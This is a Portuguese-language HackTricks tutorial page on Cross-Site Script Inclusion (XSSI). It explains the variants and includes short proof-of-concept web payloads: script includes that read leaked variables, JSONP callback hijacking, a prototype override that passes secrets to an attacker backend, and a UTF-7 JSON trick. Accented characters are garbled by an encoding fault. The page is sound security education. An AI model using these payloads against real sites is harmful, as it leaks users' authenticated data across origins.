# XSSI (Inclus√£o de Script de Sites Cruzados)

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>


## Informa√ß√µes B√°sicas

XSSI designa um tipo de vulnerabilidade que explora o fato de que, quando um **recurso √© inclu√≠do usando a tag `script`, a SOP n√£o se aplica**, porque os scripts devem poder ser inclu√≠dos entre dom√≠nios. Um atacante pode assim **ler tudo** que foi inclu√≠do usando a **tag `script`**.

Isso √© especialmente interessante quando se trata de JavaScript din√¢mico ou JSONP, quando informa√ß√µes de autoridade ambiente, como cookies, s√£o usadas para autentica√ß√£o. Os cookies s√£o inclu√≠dos ao solicitar um recurso de um host diferente.

### Tipos

1. JavaScript Est√°tico (XSSI regular)
2. JavaScript Est√°tico, que s√≥ √© acess√≠vel quando autenticado
3. JavaScript Din√¢mico
4. N√£o-JavaScript

**As seguintes informa√ß√µes s√£o um resumo de [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Consulte para mais detalhes.


### XSSI Regular
Neste m√©todo, informa√ß√µes privadas s√£o incorporadas em um arquivo JavaScript globalmente acess√≠vel. Os atacantes podem identificar esses arquivos usando m√©todos como leitura de arquivos, pesquisas de palavras-chave ou express√µes regulares. Uma vez localizado, o script contendo informa√ß√µes privadas pode ser inclu√≠do em conte√∫do malicioso, permitindo acesso n√£o autorizado a dados sens√≠veis. Uma t√©cnica de explora√ß√£o de exemplo √© mostrada abaixo:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### XSSI baseado em JavaScript din√¢mico e XSSI autenticado em JavaScript
Esses tipos de ataques XSSI envolvem informa√ß√µes confidenciais sendo adicionadas dinamicamente ao script em resposta a uma solicita√ß√£o do usu√°rio. A detec√ß√£o pode ser realizada enviando solicita√ß√µes com e sem cookies e comparando as respostas. Se as informa√ß√µes diferirem, isso pode indicar a presen√ßa de informa√ß√µes confidenciais. Esse processo pode ser automatizado usando ferramentas como a extens√£o Burp [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

Se os dados confidenciais estiverem armazenados em uma vari√°vel global, eles podem ser explorados usando m√©todos semelhantes aos usados no XSSI Regular. No entanto, se os dados confidenciais estiverem inclu√≠dos em uma resposta JSONP, os atacantes podem sequestrar a fun√ß√£o de retorno de chamada para recuperar as informa√ß√µes. Isso pode ser feito manipulando objetos globais ou configurando uma fun√ß√£o para ser executada pela resposta JSONP, conforme demonstrado abaixo:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Para vari√°veis que n√£o residem no namespace global, *manipula√ß√£o de prot√≥tipo* √†s vezes pode ser explorada. Essa t√©cnica aproveita o design do JavaScript, onde a interpreta√ß√£o de c√≥digo envolve percorrer a cadeia de prot√≥tipos para localizar a propriedade chamada. Ao substituir certas fun√ß√µes, como `slice` do `Array`, os atacantes podem acessar e vazar vari√°veis n√£o globais:
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
Mais detalhes sobre vetores de ataque podem ser encontrados no trabalho do Pesquisador de Seguran√ßa [Sebastian Lekies](https://twitter.com/slekies), que mant√©m uma lista de [vetores](http://sebastian-lekies.de/leak/).

### Non-Script-XSSI
A pesquisa de Takeshi Terada introduz outra forma de XSSI, onde arquivos Non-Script, como CSV, s√£o vazados entre origens ao serem inclu√≠dos como fontes em uma tag `script`. Inst√¢ncias hist√≥ricas de XSSI, como o ataque de 2006 de Jeremiah Grossman para ler um cat√°logo de endere√ßos completo do Google e o vazamento de dados JSON de 2007 de Joe Walker, destacam a gravidade dessas amea√ßas. Al√©m disso, Gareth Heyes descreve uma variante de ataque envolvendo JSON codificado em UTF-7 para escapar do formato JSON e executar scripts, eficaz em certos navegadores:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
